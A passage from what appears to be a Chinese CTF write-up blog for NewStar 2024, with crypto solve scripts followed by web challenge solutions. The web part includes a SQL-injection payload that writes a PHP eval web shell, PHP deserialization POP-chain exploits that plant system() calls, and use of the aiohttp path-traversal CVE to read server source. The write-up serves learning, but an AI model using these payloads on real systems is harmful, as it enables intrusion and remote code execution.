</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> __name__ <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;__main__&#34;</span>:
</span></span><span style="display:flex;"><span>    main()
</span></span></code></pre></div><h3 id="easy_ecc">easy_ecc<a hidden class="anchor" aria-hidden="true" href="#easy_ecc">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sage.all <span style="color:#f92672">import</span> <span style="color:#f92672">*</span> <span style="color:#75715e"># type: ignore</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Given parameters</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">64408890408990977312449920805352688472706861581336743385477748208693864804529</span>
</span></span><span style="display:flex;"><span>a <span style="color:#f92672">=</span> <span style="color:#ae81ff">111430905433526442875199303277188510507615671079377406541731212384727808735043</span>
</span></span><span style="display:flex;"><span>b <span style="color:#f92672">=</span> <span style="color:#ae81ff">89198454229925288228295769729512965517404638795380570071386449796440992672131</span>
</span></span><span style="display:flex;"><span>k <span style="color:#f92672">=</span> <span style="color:#ae81ff">86388708736702446338970388622357740462258632504448854088010402300997950626097</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Given ciphertext points</span>
</span></span><span style="display:flex;"><span>c1_x <span style="color:#f92672">=</span> <span style="color:#ae81ff">10968743933204598092696133780775439201414778610710138014434989682840359444219</span>
</span></span><span style="display:flex;"><span>c1_y <span style="color:#f92672">=</span> <span style="color:#ae81ff">50103014985350991132553587845849427708725164924911977563743169106436852927878</span>
</span></span><span style="display:flex;"><span>c2_x <span style="color:#f92672">=</span> <span style="color:#ae81ff">16867464324078683910705186791465451317548022113044260821414766837123655851895</span>
</span></span><span style="display:flex;"><span>c2_y <span style="color:#f92672">=</span> <span style="color:#ae81ff">35017929439600128416871870160299373917483006878637442291141472473285240957511</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Given encrypted message parts</span>
</span></span><span style="display:flex;"><span>c_left <span style="color:#f92672">=</span> <span style="color:#ae81ff">15994601655318787407246474983001154806876869424718464381078733967623659362582</span>
</span></span><span style="display:flex;"><span>c_right <span style="color:#f92672">=</span> <span style="color:#ae81ff">3289163848384516328785319206783144958342012136997423465408554351179699716569</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Initialize the elliptic curve</span>
</span></span><span style="display:flex;"><span>E <span style="color:#f92672">=</span> EllipticCurve(GF(p), [a,b])
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert points to curve points</span>
</span></span><span style="display:flex;"><span>C1 <span style="color:#f92672">=</span> E(c1_x, c1_y)
</span></span><span style="display:flex;"><span>C2 <span style="color:#f92672">=</span> E(c2_x, c2_y)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Decrypt the message point</span>
</span></span><span style="display:flex;"><span>M <span style="color:#f92672">=</span> C1 <span style="color:#f92672">-</span> k<span style="color:#f92672">*</span>C2
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Get the original message coordinates</span>
</span></span><span style="display:flex;"><span>m_x <span style="color:#f92672">=</span> M[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>m_y <span style="color:#f92672">=</span> M[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert to GF(p) elements</span>
</span></span><span style="display:flex;"><span>F <span style="color:#f92672">=</span> GF(p)
</span></span><span style="display:flex;"><span>m_x <span style="color:#f92672">=</span> F(m_x)
</span></span><span style="display:flex;"><span>m_y <span style="color:#f92672">=</span> F(m_y)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate multiplicative inverse</span>
</span></span><span style="display:flex;"><span>m_x_inv <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>m_x
</span></span><span style="display:flex;"><span>m_y_inv <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">/</span>m_y
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Recover the flag parts using multiplicative inverse</span>
</span></span><span style="display:flex;"><span>flag_left <span style="color:#f92672">=</span> c_left <span style="color:#f92672">*</span> m_x_inv
</span></span><span style="display:flex;"><span>flag_right <span style="color:#f92672">=</span> c_right <span style="color:#f92672">*</span> m_y_inv
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Convert to bytes</span>
</span></span><span style="display:flex;"><span>flag_left <span style="color:#f92672">=</span> long_to_bytes(int(flag_left))
</span></span><span style="display:flex;"><span>flag_right <span style="color:#f92672">=</span> long_to_bytes(int(flag_right))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Print the result</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Recovered flag:&#34;</span>, flag_left <span style="color:#f92672">+</span> flag_right)
</span></span></code></pre></div><h3 id="没e也能玩">没e也能玩<a hidden class="anchor" aria-hidden="true" href="#没e也能玩">#</a></h3>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> Crypto.Util.number <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> gmpy2 <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">solve_rsa_crt</span>(c, p, q, dp, dq):
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate q_inv = q^(-1) mod p</span>
</span></span><span style="display:flex;"><span>    q_inv <span style="color:#f92672">=</span> int(invert(q, p))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Calculate message parts using CRT</span>
</span></span><span style="display:flex;"><span>    m1 <span style="color:#f92672">=</span> pow(c, dp, p)
</span></span><span style="display:flex;"><span>    m2 <span style="color:#f92672">=</span> pow(c, dq, q)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># Use CRT to combine results</span>
</span></span><span style="display:flex;"><span>    h <span style="color:#f92672">=</span> (q_inv <span style="color:#f92672">*</span> (m1 <span style="color:#f92672">-</span> m2)) <span style="color:#f92672">%</span> p
</span></span><span style="display:flex;"><span>    m <span style="color:#f92672">=</span> m2 <span style="color:#f92672">+</span> h <span style="color:#f92672">*</span> q
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> m
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Given values</span>
</span></span><span style="display:flex;"><span>c <span style="color:#f92672">=</span> <span style="color:#ae81ff">312026920216195772014255984174463085443866592575942633449581804171108045852080517840578408476885673600123673447592477875543106559822653280458539889975125069364584140981069913341705738633426978886491359036285144974311751490792757751756044409664421663980721578870582548395096887840688928684149014816557276765747135567714257184475027270111822159712532338590457693333403200971556224662094381891648467959054115723744963414673861964744567056823925630723343002325605154661959863849738333074326769879861280895388423162444746726568892877802824353858845944856881876742211956986853244518521508714633279380808950337611574412909</span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> <span style="color:#ae81ff">108043725609186781791705090463399988837848128384507136697546885182257613493145758848215714322999196482303958182639388180063206708575175264502030010971971799850889123915580518613554382722069874295016841596099030496486069157061211091761273568631799006187376088457421848367280401857536410610375012371577177832001</span>
</span></span><span style="display:flex;"><span>q <span style="color:#f92672">=</span> <span style="color:#ae81ff">121590551121540247114817509966135120751936084528211093275386628666641298457070126234836053337681325952068673362753408092990553364818851439157868686131416391201519794244659155411228907897025948436021990520853498462677797392855335364006924106615008646396883330251028071418465977013680888333091554558623089051503</span>
</span></span><span style="display:flex;"><span>dp <span style="color:#f92672">=</span> <span style="color:#ae81ff">11282958604593959665264348980446305500804623200078838572989469798546944577064705030092746827389207634235443944672230537015008113180165395276742807804632116181385860873677969229460704569172318227491268503039531329141563655811632035522134920788501646372986281785901019732756566066694831838769040155501078857473</span>
</span></span><span style="display:flex;"><span>dq <span style="color:#f92672">=</span> <span style="color:#ae81ff">46575357360806054039250786123714177813397065260787208532360436486982363496441528434309234218672688812437737096579970959403617066243685956461527617935564293219447837324227893212131933165188205281564552085623483305721400518031651417947568896538797580895484369480168587284879837144688420597737619751280559493857</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Solve and convert result to text</span>
</span></span><span style="display:flex;"><span>m <span style="color:#f92672">=</span> solve_rsa_crt(c, p, q, dp, dq)
</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> long_to_bytes(m)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Decrypted flag: </span><span style="color:#e6db74">{</span>flag<span style="color:#f92672">.</span>decode()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span></code></pre></div><h2 id="web-4">web<a hidden class="anchor" aria-hidden="true" href="#web-4">#</a></h2>
<h3 id="sqlshell复现">sqlshell(复现)<a hidden class="anchor" aria-hidden="true" href="#sqlshell复现">#</a></h3>
<p>没想到直接这么写orz</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>alice<span style="color:#e6db74">&#39; union select 1,&#39;</span>&lt;?php eval<span style="color:#f92672">(</span>$_POST<span style="color:#f92672">[</span>1<span style="color:#f92672">])</span>;?&gt;<span style="color:#e6db74">&#39;,3 INTO OUTFILE &#39;</span>/var/www/html/orange.php<span style="color:#960050;background-color:#1e0010">&#39;</span><span style="color:#75715e">#</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>1<span style="color:#f92672">=</span>system<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;cat /you_cannot_read_the_flag_directly&#39;</span><span style="color:#f92672">)</span>;
</span></span></code></pre></div><h3 id="臭皮吹泡泡复现">臭皮吹泡泡(复现)<a hidden class="anchor" aria-hidden="true" href="#臭皮吹泡泡复现">#</a></h3>
<p>好长的pop链当时有其他比赛自己也没细看，跟着学学吧</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span> <span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">error_reporting</span>(<span style="color:#ae81ff">0</span>);
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">highlight_file</span>(<span style="color:#66d9ef">__FILE__</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">study</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $study;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">study</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;happy&#34;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">study</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">ctf</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $ctf;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__tostring</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span> <span style="color:#f92672">===</span> <span style="color:#e6db74">&#34;phpinfo&#34;</span>) {
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">die</span>(<span style="color:#e6db74">&#34;u can&#39;t do this!!!!!!!&#34;</span>);
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>        ($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span>)(<span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;can can need&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">let_me</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $let_me;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $time;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">get_flag</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $runcode<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php #&#34;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">let_me</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34;?&gt;&#34;</span>;
</span></span><span style="display:flex;"><span>        $tmpfile<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;code.php&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span> {
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">file_put_contents</span>($tmpfile,$runcode);
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">echo</span> (<span style="color:#e6db74">&#34;we need more&#34;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">time</span>);
</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">unlink</span>($tmpfile);
</span></span><span style="display:flex;"><span>        }<span style="color:#66d9ef">catch</span> (<span style="color:#a6e22e">Exception</span> $e){
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#e6db74">&#34;no!&#34;</span>;
</span></span><span style="display:flex;"><span>        }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__destruct</span>(){
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;study ctf let me happy&#34;</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">class</span> <span style="color:#a6e22e">happy</span>
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> $sign_in;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">__wakeup</span>()
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        $str <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;sign in &#34;</span><span style="color:#f92672">.</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sign_in</span><span style="color:#f92672">.</span><span style="color:#e6db74">&#34; here&#34;</span>;
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> $str;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>$signin <span style="color:#f92672">=</span> $_GET[<span style="color:#e6db74">&#39;new_star[ctf&#39;</span>];
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> ($signin) {
</span></span><span style="display:flex;"><span>    $signin <span style="color:#f92672">=</span> <span style="color:#a6e22e">base64_decode</span>($signin);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">unserialize</span>($signin);
</span></span><span style="display:flex;"><span>}<span style="color:#66d9ef">else</span>{
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;你是真正的CTF New Star 吗？ 让我看看你的能力&#34;</span>;
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>先讲一下野生wp的</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$exp<span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">happy</span>;
</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sign_in</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctf</span>;
</span></span><span style="display:flex;"><span>$expp <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">let_me</span>;
</span></span><span style="display:flex;"><span>$expp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">let_me</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">system(</span><span style="color:#ae81ff">\$</span><span style="color:#e6db74">_GET[1]);&#34;</span>;
</span></span><span style="display:flex;"><span>$expp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">time</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">study</span>;
</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sign_in</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span><span style="color:#f92672">=</span><span style="color:#66d9ef">array</span>($expp,<span style="color:#e6db74">&#39;get_flag&#39;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">serialize</span>($exp);
</span></span></code></pre></div><p>最后肯定是需要进到<code>getflag()</code>写文件进去执行rce,最后的代码里由于有<code>.</code>可以被当成语句触发调用<code>__tostring()</code>,然后利用数组调用<code>($this-&gt;ctf)(1);</code>这里有换行是为了过滤前面的内容，提前闭合。至于调用study我不太明白，问的ai说的是保持链的生命周期。</p>
<p>原理是在unlink之前触发catch异常防止删掉<code>code.php</code>,懂博主在说什么实操不怎么顺利。</p>
<p>学一下官p的思路</p>
<p>官p的关键点是<code> ($this-&gt;ctf)(1);</code>这里的ctf可以赋值为sleep，这样可以先执行睡眠1s再删除文件</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span>$payload  <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">happy</span>();
</span></span><span style="display:flex;"><span>$payload <span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sign_in</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctf</span>();
</span></span><span style="display:flex;"><span>$exp <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">let_me</span>();
</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">let_me</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;?&gt; &lt;?php system(&#39;cat /flag&#39;);&#34;</span>;
</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">time</span><span style="color:#f92672">=</span><span style="color:#66d9ef">new</span> <span style="color:#a6e22e">ctf</span>();
</span></span><span style="display:flex;"><span>$exp<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">time</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;sleep&#34;</span>;
</span></span><span style="display:flex;"><span>$payload <span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sign_in</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ctf</span> <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>($exp,<span style="color:#e6db74">&#34;get_flag&#34;</span>);
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">echo</span> <span style="color:#a6e22e">base64_encode</span>(<span style="color:#a6e22e">serialize</span>($payload));
</span></span></code></pre></div><p>由于类似于条件竞争，所以需要手速快一点或者用脚本。</p>
<h3 id="臭皮的网站复现">臭皮的网站(复现)<a hidden class="anchor" aria-hidden="true" href="#臭皮的网站复现">#</a></h3>
<p>源码给了提示</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-markdown" data-lang="markdown"><span style="display:flex;"><span>YWlvaHR0cD8gbmdpbng/IHJlYWRmaWxlPw==
</span></span><span style="display:flex;"><span>aiohttp? nginx? readfile?
</span></span></code></pre></div><p>网站是 aiohttp 框架，考察的是<code>CVE-2024-23334</code></p>
<p><img alt="57" loading="lazy" src="../../images/Newstar/2024/57.png"></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>HTTP<span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span> <span style="color:#ae81ff">200</span> OK
</span></span><span style="display:flex;"><span>Server: nginx<span style="color:#f92672">/</span><span style="color:#ae81ff">114.5.14</span>
</span></span><span style="display:flex;"><span>Content<span style="color:#f92672">-</span>Type: text<span style="color:#f92672">/</span>x<span style="color:#f92672">-</span>python
</span></span><span style="display:flex;"><span>Etag: <span style="color:#e6db74">&#34;17f68b1f9ac4ce00-fe6&#34;</span>
</span></span><span style="display:flex;"><span>Last<span style="color:#f92672">-</span>Modified: Thu, <span style="color:#ae81ff">19</span> Sep <span style="color:#ae81ff">2024</span> <span style="color:#ae81ff">04</span>:<span style="color:#ae81ff">34</span>:<span style="color:#ae81ff">35</span> GMT
</span></span><span style="display:flex;"><span>Content<span style="color:#f92672">-</span>Length: <span style="color:#ae81ff">4070</span>
</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">-</span>Ranges: bytes
</span></span><span style="display:flex;"><span>Date: Sun, <span style="color:#ae81ff">10</span> Nov <span style="color:#ae81ff">2024</span> <span style="color:#ae81ff">13</span>:<span style="color:#ae81ff">10</span>:<span style="color:#ae81ff">38</span> GMT
</span></span><span style="display:flex;"><span>Connection: close
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> subprocess
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> aiohttp <span style="color:#f92672">import</span> web
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> aiohttp_session <span style="color:#f92672">import</span> setup <span style="color:#66d9ef">as</span> session_setup, get_session
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> aiohttp_session.cookie_storage <span style="color:#f92672">import</span> EncryptedCookieStorage
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> uuid
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> secrets
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> random
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> string
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> base64
</span></span><span style="display:flex;"><span>random<span style="color:#f92672">.</span>seed(uuid<span style="color:#f92672">.</span>getnode())
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp_session cryptography</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># pip install -i https://pypi.tuna.tsinghua.edu.cn/simple aiohttp==3.9.1</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>adminname <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;admin&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">CreteKey</span>():
</span></span><span style="display:flex;"><span>    key_bytes <span style="color:#f92672">=</span> secrets<span style="color:#f92672">.</span>token_bytes(<span style="color:#ae81ff">32</span>)
</span></span><span style="display:flex;"><span>    key_str <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>urlsafe_b64encode(key_bytes)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;ascii&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> key_str
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">authenticate</span>(username, password):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> username <span style="color:#f92672">==</span> adminname <span style="color:#f92672">and</span> password <span style="color:#f92672">==</span><span style="color:#e6db74">&#39;&#39;</span><span style="color:#f92672">.</span>join(random<span style="color:#f92672">.</span>choices(string<span style="color:#f92672">.</span>ascii_letters <span style="color:#f92672">+</span> string<span style="color:#f92672">.</span>digits, k<span style="color:#f92672">=</span><span style="color:#ae81ff">8</span>)):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">middleware</span>(app, handler):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">middleware_handler</span>(request):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> handler(request)
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Server&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nginx/114.5.14&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> web<span style="color:#f92672">.</span>HTTPNotFound:
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> handler_404(request)
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Server&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nginx/114.5.14&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">Exception</span>:
</span></span><span style="display:flex;"><span>            response <span style="color:#f92672">=</span> <span style="color:#66d9ef">await</span> handler_500(request)
</span></span><span style="display:flex;"><span>            response<span style="color:#f92672">.</span>headers[<span style="color:#e6db74">&#39;Server&#39;</span>] <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;nginx/114.5.14&#39;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> response
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> middleware_handler
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">async</span> <span style="color:#66d9ef">def</span> <span style="color:#a6e22e">handler_404</span>(request):
